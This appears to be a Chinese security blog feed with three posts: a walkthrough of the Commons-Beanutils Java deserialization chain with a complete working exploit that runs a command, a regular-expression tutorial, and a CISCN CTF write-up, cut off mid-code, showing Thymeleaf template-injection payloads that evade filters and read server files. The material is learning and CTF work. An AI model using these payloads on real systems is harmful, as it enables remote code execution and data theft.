class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>只需将<code>o1</code>和<code>o2</code>设置为恶意Templates，<code>this.property</code>设置为字符串<code>outputProperties</code>，就和后半段连通了，<code>BeanComparator.compare()</code>的上层自然就是<code>PriorityQueue.readObject()</code>，通过前面CC2了解到在<code>PriorityQueue</code>类的<code>readObject()</code>方法中，会一路调用到<code>comparator.compare()</code>方法，将<code>comparator</code>属性设置为<code>BeanComparator</code>即可</p><br/><h2 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>首先是恶意<code>TemplatesImpl</code>的构建</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">       </span><br><span class="line">constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">test.setSuperclass(superClass);</span><br><span class="line"><span class="type">byte</span>[] bytes = test.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p>构造<code>beanComparator</code>，设置其<code>property</code>字段为字符串<code>outputProperties</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BeanComparator&lt;TemplatesImpl&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>接下来构造<code>priorityQueue</code>，过程和cc2的构造差不多，要保证有两个元素确保反序列化时<code>compare()</code>能够执行，延迟注入<code>comparator</code>避免提前执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">Class&lt;?&gt; clazz = priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(priorityQueue, beanComparator);</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br></pre></td></tr></table></figure><p>全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytes = test.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        BeanComparator&lt;Object&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, beanComparator);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cb.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cb.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该依赖曾被shiro框架使用，也是shiro反序列化执行命令的重要组成</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2026/01/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2026/01/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>正则表达式是一种用于匹配和操作文本的强大工具，它是由一系列字符和特殊字符组成的模式，用于描述要匹配的文本模式</p><br/><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>我们来看一个典型的正则表达式，该表达式用于匹配中国大陆身份证号码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/^(?&lt;province&gt;1[1-5]|2[1-3]|3[1-7]|4[1-6]|5[1-3]|6[1-5]|7[1-3]|8[1-2]|9[1-2])[0-9]&#123;4&#125;(?&lt;birthday&gt;19[0-9]&#123;2&#125;|20[0-1][0-9])(0[1-9]|1[0-2])(0[1-9]|[12][0-9]|3[01])(?&lt;sequence&gt;[0-9]&#123;3&#125;)(?&lt;check&gt;[0-9Xx])$/</span><br></pre></td></tr></table></figure><p>正则表达式以<code>/^</code>和<code>$/</code>作为<strong>定界符</strong>，分别表示正则表达式的开始与结束，字符 <strong>^</strong> 和 <strong>$</strong> 同时使用时，表示精确匹配</p><p>形如<code>(?&lt;province&gt;...)</code>或 <code>(?&#39;province&#39;...)</code>的结构称为<strong>命名捕获组</strong>，表示将匹配的内容捕获进名为<code>province</code>的组中</p><p><code>1[1-5]|2[1-3]|</code>这表示第一位数字为1时，第二位数字只能为1~5中的值，如果第一位数字为2，则第二位数字的取值范围则为1~3，因此可见<code>|</code>符号用于表达一种<strong>逻辑或</strong>关系</p><p>在第一个命名捕获组结束后，<code>{4}</code>为<strong>精确数量限定符</strong>，表示前面的模式必须恰好重复4次，用于匹配身份证中的市级、县级地址码，该限定符只对前面的<code>[0-9]</code>有效，表示第一个命名捕获组结束后应接4个任意数字</p><p>后面生日的部分就很好理解了，这里匹配了1900~2019年间出生的人，还有顺序码，匹配三位数字</p><p>最后是校验码，<code>[0-9Xx]</code>表示匹配任意数字和字母<code>X</code>和<code>x</code></p><br/><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>正则表达式中的元字符是具有特殊含义的字符，它们不表示字面意义，而是用于控制匹配模式</p><h3 id="基本元字符"><a href="#基本元字符" class="headerlink" title="基本元字符"></a>基本元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong><code>.</code></strong></td><td align="left">匹配**除换行符(\n)**外的任意单个字符</td><td align="left"><code>a.b</code></td></tr><tr><td align="left"><strong><code>^</code></strong></td><td align="left">匹配<strong>字符串的开始位置</strong></td><td align="left"><code>^abc</code></td></tr><tr><td align="left"><strong><code>$</code></strong></td><td align="left">匹配<strong>字符串的结束位置</strong></td><td align="left"><code>xyz$</code></td></tr><tr><td align="left"><strong><code>\</code></strong></td><td align="left">1. 使特殊字符变为普通字符 2. 使普通字符获得特殊含义</td><td align="left"><code>\d</code></td></tr></tbody></table><h3 id="字符类元字符"><a href="#字符类元字符" class="headerlink" title="字符类元字符"></a>字符类元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong><code>[ ]</code></strong></td><td align="left">定义字符集合，匹配其中任意一个字符</td><td align="left"><code>[aeiou]</code></td></tr><tr><td align="left"><strong><code>[^ ]</code></strong></td><td align="left">匹配<strong>不在</strong>方括号中的任意字符</td><td align="left"><code>[^0-9]</code></td></tr><tr><td align="left"><strong><code>-</code></strong></td><td align="left">在字符类中表示字符范围</td><td align="left"><code>[a-z]</code>、<code>[0-9A-F]</code></td></tr></tbody></table><h3 id="量词元字符"><a href="#量词元字符" class="headerlink" title="量词元字符"></a>量词元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong><code>\*</code></strong></td><td align="left">匹配前面的子表达式<strong>零次或多次</strong></td><td align="left"><code>ab*c</code></td></tr><tr><td align="left"><strong><code>+</code></strong></td><td align="left">匹配前面的子表达式<strong>一次或多次</strong></td><td align="left"><code>ab+c</code></td></tr><tr><td align="left"><strong><code>?</code></strong></td><td align="left">匹配前面的子表达式<strong>零次或一次</strong></td><td align="left"><code>colou?r</code></td></tr><tr><td align="left"><strong><code>{n}</code></strong></td><td align="left"><strong>精确匹配</strong>前面的子表达式<strong>n次</strong></td><td align="left"><code>a{3}</code></td></tr><tr><td align="left"><strong><code>{n,}</code></strong></td><td align="left">匹配前面的子表达式<strong>至少n次</strong></td><td align="left"><code>a{2,}</code></td></tr><tr><td align="left"><strong><code>{n,m}</code></strong></td><td align="left">匹配前面的子表达式<strong>n到m次</strong></td><td align="left"><code>a{2,4}</code></td></tr></tbody></table><h3 id="分组和选择元字符"><a href="#分组和选择元字符" class="headerlink" title="分组和选择元字符"></a>分组和选择元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong><code>( )</code></strong></td><td align="left">定义子表达式或捕获组</td><td align="left"><code>(ab)+</code></td></tr><tr><td align="left"><strong><code>|</code></strong></td><td align="left">表示逻辑”或”关系</td><td align="left"><code>cat|dog</code></td></tr></tbody></table><h3 id="特殊字符类元字符"><a href="#特殊字符类元字符" class="headerlink" title="特殊字符类元字符"></a>特殊字符类元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">等价字符类</th></tr></thead><tbody><tr><td align="left"><strong><code>\d</code></strong></td><td align="left">匹配任意数字</td><td align="left"><code>[0-9]</code></td></tr><tr><td align="left"><strong><code>\D</code></strong></td><td align="left">匹配任意非数字</td><td align="left"><code>[^0-9]</code></td></tr><tr><td align="left"><strong><code>\w</code></strong></td><td align="left">匹配任意单词字符（字母、数字、下划线）</td><td align="left"><code>[a-zA-Z0-9_]</code></td></tr><tr><td align="left"><strong><code>\W</code></strong></td><td align="left">匹配任意非单词字符</td><td align="left"><code>[^a-zA-Z0-9_]</code></td></tr><tr><td align="left"><strong><code>\s</code></strong></td><td align="left">匹配任意空白字符（空格、制表符、换行符等）</td><td align="left"><code>[ \t\r\n\f]</code></td></tr><tr><td align="left"><strong><code>\S</code></strong></td><td align="left">匹配任意非空白字符</td><td align="left"><code>[^ \t\r\n\f]</code></td></tr></tbody></table><h3 id="边界匹配元字符"><a href="#边界匹配元字符" class="headerlink" title="边界匹配元字符"></a>边界匹配元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong><code>\b</code></strong></td><td align="left">匹配单词边界（单词与非单词字符的交界处）</td><td align="left"><code>\bcat\b</code></td></tr><tr><td align="left"><strong><code>\B</code></strong></td><td align="left">匹配非单词边界</td><td align="left"><code>\Bcat\B</code></td></tr></tbody></table><p><code>\bcat\b</code> 匹配 <code>cat</code> 但不匹配 <code>category</code>，<code>\Bcat\B</code> 匹配 <code>scattered</code>中的 <code>cat</code>但不匹配单独的 <code>cat</code></p><h3 id="其他元字符"><a href="#其他元字符" class="headerlink" title="其他元字符"></a>其他元字符</h3><table><thead><tr><th align="left">元字符</th><th align="left">功能描述</th><th align="left">ASCII值</th><th align="left">常见来源</th></tr></thead><tbody><tr><td align="left"><strong><code>\n</code></strong></td><td align="left">匹配换行符（换行）</td><td align="left">0x0A</td><td align="left">Unix&#x2F;Linux 换行符</td></tr><tr><td align="left"><strong><code>\t</code></strong></td><td align="left">匹配制表符</td><td align="left">0x09</td><td align="left">键盘 Tab 键</td></tr><tr><td align="left"><strong><code>\r</code></strong></td><td align="left">匹配回车符</td><td align="left">0x0D</td><td align="left">老式 Mac 换行符，Windows 换行符的一部分</td></tr><tr><td align="left"><strong><code>\f</code></strong></td><td align="left">匹配换页符</td><td align="left">0x0C</td><td align="left">打印机换页</td></tr><tr><td align="left"><strong><code>\v</code></strong></td><td align="left">匹配垂直制表符</td><td align="left">0x0B</td><td align="left">垂直制表</td></tr></tbody></table><br/><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>正则表达式修饰符（也称为模式修饰符或标记）是用于改变正则表达式匹配行为的特殊指令，标记不写在正则表达式里，标记位于表达式之外，格式：<code>/pattern/flags</code></p><table><thead><tr><th align="left">修饰符</th><th align="left">功能描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong><code>i</code></strong></td><td align="left">忽略大小写，使匹配不区分大小写</td><td align="left"><code>/abc/i</code></td></tr><tr><td align="left"><strong><code>g</code></strong></td><td align="left">全局匹配，查找所有匹配项而不是第一个就停止</td><td align="left"><code>/ab/g</code></td></tr><tr><td align="left"><strong><code>m</code></strong></td><td align="left">多行模式，使 <code>^</code> 和 <code>$</code> 匹配每行的开头和结尾</td><td align="left"><code>/^abc/m</code></td></tr><tr><td align="left"><strong><code>s</code></strong></td><td align="left">单行模式，使点号 <code>.</code> 匹配包括换行符在内的所有字符</td><td align="left"><code>/a.b/s</code></td></tr><tr><td align="left"><strong><code>u</code></strong></td><td align="left">Unicode模式，启用完整的Unicode支持</td><td align="left"><code>/\p{L}/u</code></td></tr><tr><td align="left"><strong><code>y</code></strong></td><td align="left">粘性匹配，从目标字符串的当前位置开始匹配</td><td align="left"><code>/a/y</code></td></tr><tr><td align="left"><strong><code>x</code></strong></td><td align="left">扩展模式，忽略模式中的空白和注释</td><td align="left"><code>/a b c/x</code></td></tr></tbody></table><br/><h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>断言（Assertion）是正则表达式中用于指定匹配位置的元字符，它们不匹配任何实际字符，而是匹配字符之间的位置</p><table><thead><tr><th align="left">断言类型</th><th align="left">正则语法</th><th align="left">别称</th><th align="left">检查方向</th><th align="left">期望条件</th></tr></thead><tbody><tr><td align="left"><strong>正向先行断言</strong></td><td align="left"><code>(?=pattern)</code></td><td align="left">正前瞻</td><td align="left">向右（向前）</td><td align="left">存在 pattern</td></tr><tr><td align="left"><strong>负向先行断言</strong></td><td align="left"><code>(?!pattern)</code></td><td align="left">负前瞻</td><td align="left">向右（向前）</td><td align="left">不存在 pattern</td></tr><tr><td align="left"><strong>正向后行断言</strong></td><td align="left"><code>(?&lt;=pattern)</code></td><td align="left">正后顾</td><td align="left">向左（向后）</td><td align="left">存在 pattern</td></tr><tr><td align="left"><strong>负向后行断言</strong></td><td align="left"><code>(?&lt;!pattern)</code></td><td align="left">负后顾</td><td align="left">向左（向后）</td><td align="left">不存在 pattern</td></tr></tbody></table><h3 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h3><p><strong>零宽度</strong>：只检查条件，不消耗字符（不包含在匹配结果中）</p><p><strong>非捕获</strong>：断言中的 pattern 不会被捕获到分组中</p><p><strong>顺序敏感</strong>：匹配引擎按顺序检查断言条件</p><br/><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>下表从最高到最低说明了各种正则表达式运算符的优先级顺序</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left">转义符</td></tr><tr><td align="left"><code>()</code>, <code>(?:)</code>, <code>(?=)</code>, <code>[]</code></td><td align="left">圆括号和方括号（分组和字符类）</td></tr><tr><td align="left"><code>*</code>, <code>+</code>, <code>?</code>, <code>{n}</code>, <code>{n,}</code>, <code>{n,m}</code></td><td align="left">限定符（量词）</td></tr><tr><td align="left"><code>^</code>, <code>$</code>, \任何元字符、任何字符</td><td align="left">定位点和序列（位置和顺序）</td></tr><tr><td align="left"><code>|</code></td><td align="left">替换，逻辑或</td></tr></tbody></table><br/><h2 id="分组和引用"><a href="#分组和引用" class="headerlink" title="分组和引用"></a>分组和引用</h2><p>在正则表达式中，<strong>分组</strong>（Grouping）允许我们将多个字符视为一个整体单元</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>使用圆括号 <code>()</code> 来创建分组：(表达式)</p><p>例如，<code>(ab)+</code> 可以匹配 “ab”、”abab”、”ababab” 等，但不能匹配 “a” 或 “b”</p><h3 id="分组类型"><a href="#分组类型" class="headerlink" title="分组类型"></a>分组类型</h3><table><thead><tr><th align="left">分组类型</th><th align="left">语法</th><th align="left">功能描述</th></tr></thead><tbody><tr><td align="left"><strong>捕获分组</strong></td><td align="left"><code>(表达式)</code></td><td align="left">捕获匹配内容并分配编号（从1开始）</td></tr><tr><td align="left"><strong>非捕获分组</strong></td><td align="left"><code>(?:表达式)</code></td><td align="left">只分组但不捕获匹配内容</td></tr><tr><td align="left"><strong>命名分组</strong></td><td align="left"><code>(?&lt;name&gt;表达式)</code> 或 <code>(?P&lt;name&gt;表达式)</code></td><td align="left">捕获匹配内容并分配名称</td></tr></tbody></table><h3 id="分组引用"><a href="#分组引用" class="headerlink" title="分组引用"></a>分组引用</h3><table><thead><tr><th align="left">引用类型</th><th align="left">语法</th><th align="left">功能描述</th></tr></thead><tbody><tr><td align="left"><strong>反向引用（表达式内）</strong></td><td align="left"><code>\数字</code></td><td align="left">在正则表达式内部引用前面捕获分组的内容</td></tr><tr><td align="left"><strong>命名反向引用（表达式内）</strong></td><td align="left"><code>\k&lt;name&gt;</code></td><td align="left">在正则表达式内部引用前面命名分组的内容</td></tr><tr><td align="left"><strong>替换引用（替换操作中）</strong></td><td align="left"><code>$数字</code> 或 <code>\数字</code></td><td align="left">在替换字符串中引用前面捕获分组的内容</td></tr></tbody></table><br/>]]></content>
      
      
      <categories>
          
          <category> 零碎 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>散题1.20</title>
      <link href="/2026/01/20/%E6%95%A3%E9%A2%981-20/"/>
      <url>/2026/01/20/%E6%95%A3%E9%A2%981-20/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2026初赛-EzJava"><a href="#CISCN-2026初赛-EzJava" class="headerlink" title="[CISCN 2026初赛]EzJava"></a>[CISCN 2026初赛]EzJava</h1><p>第一次参加国赛，虽然没有希望进线下，但还是收获颇丰。初赛给了两道Java题，到后面一题500分一题50分，另外这次的题名沿用了2024国赛的ezjava，但是这次肯定没有那么挑战性了，就只涉及了一个Java后端的SSTI模板注入，用的是<code>Thymeleaf</code>模板引擎。SpringBoot官方推荐的模板引擎</p><p>登录靶机唯一有用的是登录入口，账号密码已经提前写好了，但给的不是正确的密码。 找密码找了很久，起初扫端口扫到了<code>/;admin</code>路径，长得比较稀奇去搜了一下说是好像和SpringSercurity有关系，花了半天研究所谓的SpringSecurity绕过，浪费了很多时间。最后密码居然是弱口令<code>admin123</code>，还是涉世未深啊</p><p>后台就直接模板突脸了</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>现在时间: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;now&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>渲染出来就是现实时间</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>现在时间: <span class="tag">&lt;<span class="name">span</span>&gt;</span>2025-12-28T10:52:37.209748<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面测试7*7也可以，无所谓其实。网上找了些现成的payload试了一下，发现有三个主要的Waf，</p><p>首先是<code>T(</code>，匹配到会替换成<code>NoNo</code>，这里在中间插入个空格就能绕过了</p><p><img src="/img/post/image-20251228185955406.png" alt="image-20251228185955406"></p><p>然后是<code>new</code>，匹配到会被替换成<code>Wow</code></p><p><img src="/img/post/image-20251228213144264.png" alt="image-20251228213144264"></p><p>获取根目录文件结构</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>现在时间: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;T (java.nio.file.Files).list(T (java.nio.file.Paths).get(&#x27;/&#x27;)).collect(T (java.util.stream.Collectors).toList())&#125;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/image-20260105174223259.png" alt="image-20260105174223259"></p><p>上面的模板等价于</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Files.list(Paths.get(<span class="string">&quot;/&quot;</span>)).collect(Collectors.toList());</span><br></pre></td></tr></table></figure><p><code>Files.list()</code> 返回的是 <code>Stream&lt;Path&gt;</code>，而 <code>Collectors.toList()</code> 接收的是 <code>Stream&lt;String&gt;</code>，但模板引擎会自己进行类型转换</p><p>读取flag文件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>现在时间: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;T (java.nio.file.Files).readString(T (java.nio.file.Paths).get(T (java.lang.String).join(&#x27;&#x27;, T (java.util.Arrays).asList(&#x27;/&#x27;, &#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;_&#x27;, &#x27;y&#x27;, &#x27;o&#x27;, &#x27;u&#x27;,&#x27;_&#x27;,&#x27;d&#x27;,&#x27;0&#x27;,&#x27;n&#x27;,&#x27;t&#x27;,&#x27;_&#x27;,&#x27;k&#x27;,&#x27;n&#x27;,&#x27;0&#x27;,&#x27;w&#x27;))))&#125;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/image-20260105175349522.png" alt="image-20260105175349522"></p><p>上面的模板等价于</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Files.readString(Paths.get(String.join(<span class="string">&quot;&quot;</span>, Arrays.asList(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;0&quot;</span>, <span 